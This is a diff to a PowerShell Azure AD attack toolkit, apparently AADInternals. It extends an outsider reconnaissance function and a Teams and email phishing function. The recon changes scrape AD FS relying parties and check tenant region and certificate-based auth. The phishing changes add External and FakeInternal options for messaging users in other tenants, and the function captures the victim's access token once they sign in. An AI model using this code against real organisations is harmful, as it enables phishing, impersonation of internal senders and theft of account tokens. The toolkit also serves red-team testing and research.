@@ -21,6 +21,7 @@ function Invoke-ReconAsOutsider
     Type:  Federated or Managed
     DMARC: Is the DMARC record configured?
     STS:   The FQDN of the federated IdP's (Identity Provider) STS (Security Token Service) server
+    RPS:   Relaying parties of STS (AD FS)
 
     .Parameter DomainName
     Any domain name of the Azure AD tenant.
@@ -28,13 +29,50 @@ function Invoke-ReconAsOutsider
     .Parameter Single
     If the switch is used, doesn't get other domains of the tenant.
 
+    .Parameter GetRelayingParties
+    Tries to get relaying parties from STS. Returned if STS is AD FS and idpinitiatedsignon.aspx is enabled.
+
     .Example
     Invoke-AADIntReconAsOutsider -Domain company.com | Format-Table
 
     Tenant brand:       Company Ltd
     Tenant name:        company
     Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
+    Tenant region:      NA
     DesktopSSO enabled: False
+
+    Name                           DNS   MX    SPF  DMARC  Type      STS
+    ----                           ---   --    ---  -----  ----      ---
+    company.com                   True  True  True   True  Federated sts.company.com
+    company.mail.onmicrosoft.com  True  True  True   True  Managed
+    company.onmicrosoft.com       True  True  True  False  Managed
+    int.company.com              False False False  False  Managed 
+
+    .Example
+    Invoke-AADIntReconAsOutsider -Domain company.com -GetRelayingParties | Format-Table
+
+    Tenant brand:       Company Ltd
+    Tenant name:        company
+    Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
+    Tenant region:      NA
+    DesktopSSO enabled: False
+
+    Name                           DNS   MX    SPF  DMARC  Type      STS             RPS
+    ----                           ---   --    ---  -----  ----      ---             ---
+    company.com                   True  True  True   True  Federated sts.company.com {adatum.com, salesforce.com}
+    company.mail.onmicrosoft.com  True  True  True   True  Managed
+    company.onmicrosoft.com       True  True  True  False  Managed
+    int.company.com              False False False  False  Managed
+
+    .Example
+    Invoke-AADIntReconAsOutsider -UserName user@company.com | Format-Table
+
+    Tenant brand:       Company Ltd
+    Tenant name:        company
+    Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
+    Tenant region:      NA
+    DesktopSSO enabled: False
+    CBA enabled:        True
 
     Name                           DNS   MX    SPF  DMARC  Type      STS
     ----                           ---   --    ---  -----  ----      ---
@@ -45,22 +83,33 @@ function Invoke-ReconAsOutsider
 #>
     [cmdletbinding()]
     Param(
-        [Parameter(Mandatory=$True)]
+        [Parameter(ParameterSetName="domain",Mandatory=$True)]
         [String]$DomainName,
-        [Switch]$Single
+        [Parameter(ParameterSetName="user",Mandatory=$True)]
+        [String]$UserName,
+        [Switch]$Single,
+        [Switch]$GetRelayingParties
     )
     Process
     {
+        if([string]::IsNullOrEmpty($DomainName))
+        {
+            $DomainName = $UserName.Split("@")[1]
+
+            Write-Verbose "Checking CBA status."
+            $tenantCBA = HasCBA -UserName $UserName
+        }
         Write-Verbose "Checking if the domain $DomainName is registered to Azure AD"
-        $tenantId =    Get-TenantID -Domain $DomainName
-        $tenantName =  ""
-        $tenantBrand = ""
-        $tenantSSO =   ""
+        $tenantId =     Get-TenantID -Domain $DomainName
         if([string]::IsNullOrEmpty($tenantId))
         {
             throw "Domain $DomainName is not registered to Azure AD"
         }
-
+        $tenantName =   ""
+        $tenantBrand =  ""
+        $tenantRegion = (Get-OpenIDConfiguration -Domain $DomainName).tenant_region_scope
+        $tenantSSO =    ""
+        
         Write-Verbose "`n*`n* EXAMINING TENANT $tenantId`n*"
 
         # Don't try to get other domains
@@ -129,6 +178,28 @@ function Invoke-ReconAsOutsider
             }
             if($authUrl = $realmInfo.AuthUrl)
             {
+                # Try to read relaying parties
+                if($GetRelayingParties)
+                {
+                    try
+                    {
+                        
+                        $idpUrl = $realmInfo.AuthUrl.Substring(0,$realmInfo.AuthUrl.LastIndexOf("/")+1)
+                        $idpUrl += "idpinitiatedsignon.aspx"
+                        Write-Verbose "Getting relaying parties for $domain from $idpUrl"
+                        [xml]$page = Invoke-RestMethod -Uri $idpUrl -TimeoutSec 3
+
+                        $selectElement = $page.html.body.div.div[2].div.div.div.form.div[1].div[1].select.option
+                        $relayingParties = New-Object string[] $selectElement.Count
+                        Write-Verbose "Got $relayingParties relaying parties from $idpUrl"
+                        for($o = 0; $o -lt $selectElement.Count; $o++)
+                        {
+                            $relayingParties[$o] = $selectElement[$o].'#text'
+                        }
+                    
+                    }
+                    catch{} # Okay
+                }
                 # Get just the server name
                 $authUrl = $authUrl.split("/")[2]
             }
@@ -141,19 +212,31 @@ function Invoke-ReconAsOutsider
                 "SPF" =   $hasCloudSPF
                 "DMARC" = $hasDMARC
                 "Type" =  $realmInfo.NameSpaceType
-                "STS" =   $authUrl                    
+                "STS" =   $authUrl 
             }
+            if($GetRelayingParties)
+            {
+                $attributes["RPS"] =   $relayingParties 
+            }
+            Remove-Variable "relayingParties" -ErrorAction SilentlyContinue
             $domainInformation += New-Object psobject -Property $attributes
         }
 
         Write-Host "Tenant brand:       $tenantBrand"
         Write-Host "Tenant name:        $tenantName"
         Write-Host "Tenant id:          $tenantId"
+        Write-Host "Tenant region:      $tenantRegion"
 
         # DesktopSSO status not definitive with a single domain
         if(!$Single -or $tenantSSO -eq $true)
         {
             Write-Host "DesktopSSO enabled: $tenantSSO"
+        }
+
+        # CBA status definitive if username was provided
+        if($tenantCBA)
+        {
+            Write-Host "CBA enabled:        $tenantCBA"
         }
         
         return $domainInformation
@@ -1101,6 +1184,10 @@ function Invoke-Phishing
         [Switch]$Teams,
         [Parameter(ParameterSetName='Teams',Mandatory=$False)]
         [String]$CleanMessage='<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>',
+        [Parameter(ParameterSetName='Teams')]
+        [switch]$External,
+        [Parameter(ParameterSetName='Teams')]
+        [switch]$FakeInternal,
 
         [Parameter(ParameterSetName='Mail',Mandatory=$True)]
         [String]$Subject,
@@ -1126,26 +1213,35 @@ function Invoke-Phishing
             # Get access token from cache
             $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"
 
-            # Get the list of tenants the user has access to
-            $tenants = Get-AzureTenants -AccessToken $AccessToken
-            $tenantNames = $tenants | select -ExpandProperty Name
-
-            # Prompt for tenant choice if more than one
-            if($tenantNames.count -gt 1)
+            # If external, use the target tenant id
+            if($External)
             {
-                $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
-                for($p=0; $p -lt $tenantNames.count; $p++)
-                {
-                    $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
-                }
-                $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to sent messages to",$options,0)
-                }
-            else
-            {
-                $opt=0
+                $Tenant = Get-AADIntTenantID -UserName $Recipients[0]
             }
-            $tenantInfo = $tenants[$opt]
-            $tenant =     $tenantInfo.Id
+
+            # Get the list of tenants the user has access to if not provided
+            if([string]::IsNullOrEmpty($Tenant))
+            {
+                $tenants = Get-AzureTenants -AccessToken $AccessToken
+                $tenantNames = $tenants | select -ExpandProperty Name
+
+                # Prompt for tenant choice if more than one
+                if($tenantNames.count -gt 1)
+                {
+                    $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
+                    for($p=0; $p -lt $tenantNames.count; $p++)
+                    {
+                        $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
+                    }
+                    $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to sent messages to",$options,0)
+                }
+                else
+                {
+                    $opt=0
+                }
+                $tenantInfo = $tenants[$opt]
+                $tenant =     $tenantInfo.Id
+            }
 
             # Create a new AccessToken for graph.microsoft.com
             $refresh_token = $script:refresh_tokens["d3590ed6-52b3-4102-aeff-aad2292ab01c-https://management.core.windows.net/"]
@@ -1153,7 +1249,7 @@ function Invoke-Phishing
             {
                 throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
             }
-            $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com" -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -TenantId $tenant -RefreshToken $refresh_token -SaveToCache $true
+            $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com" -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -TenantId (Read-AccessToken -AccessToken $AccessToken).tid -RefreshToken $refresh_token -SaveToCache $true
         }
 
         # Create a body for the first request. We'll be using client id of "Microsoft Office"
@@ -1177,8 +1273,8 @@ function Invoke-Phishing
         {
             if($Teams)
             {
-                $msgDetails = Send-TeamsMessage -AccessToken $AccessToken -Recipients $recipient -Message $Message -Html
-                Write-Host "Teams message sent to: $Recipients. Message id: $($msgDetails.MessageID)"
+                $msgDetails = Send-TeamsMessage -AccessToken $AccessToken -Recipients $recipient -Message $Message -Html -External $External -FakeInternal $FakeInternal
+                Write-Host "Teams message sent to: $Recipients. ClientMessageId: $($msgDetails.ClientMessageId)"
                 $msgDetails | Add-Member -NotePropertyName "Recipient" -NotePropertyValue $recipient
                 $teamsMessages += $msgDetails
             }
@@ -1245,6 +1341,10 @@ function Invoke-Phishing
 
         # Dump the name
         $user = (Read-Accesstoken -AccessToken $response.access_token).upn
+        if([String]::IsNullOrEmpty($user))
+        {
+            $user = (Read-Accesstoken -AccessToken $response.access_token).unique_name
+        }
         Write-Host "Received access token for $user"
 
         # Clear the teams messages
